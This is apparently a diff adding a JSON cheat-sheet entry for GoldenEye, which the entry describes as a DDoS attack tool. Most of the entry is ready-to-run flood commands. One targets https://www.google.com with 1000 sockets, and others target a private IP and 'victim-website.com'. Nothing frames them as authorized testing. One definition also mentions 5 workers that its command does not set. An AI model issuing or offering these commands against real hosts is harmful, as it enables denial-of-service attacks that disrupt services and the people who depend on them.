@@ -1,0 +1,30 @@
+{
+  "id": "goldeneye",
+  "title": "GoldenEye",
+  "slug": "goldeneye",
+  "description": "GoldenEye is a powerful and effective tool for performing DDOS attacks.",
+  "colorPref": "#5c2b29",
+  "contents": [
+    {
+      "title": "Usage",
+      "items": [
+        {
+          "definition": "Display all the options.",
+          "code": "./goldeneye.py -h"
+        },
+        {
+          "definition": "Perform DDoS attack on any domain. ‘s’ is used to specify no. of concurrent sockets.",
+          "code": "./goldeneye.py https://www.google.com -s 1000"
+        },
+        {
+          "definition": "send traffic in ‘random’ mode with 5 workers running 10 connections each.",
+          "code": "./goldeneye.py  http://192.168.0.233:80/ -s 10 -m random"
+        },
+        {
+          "definition": "Workers (-w), sockets (-s) and method (-m)",
+          "code": "./goldeneye.py victim-website.com -w 100 -s 70 -m post"
+        }
+      ]
+    }
+  ]
+}
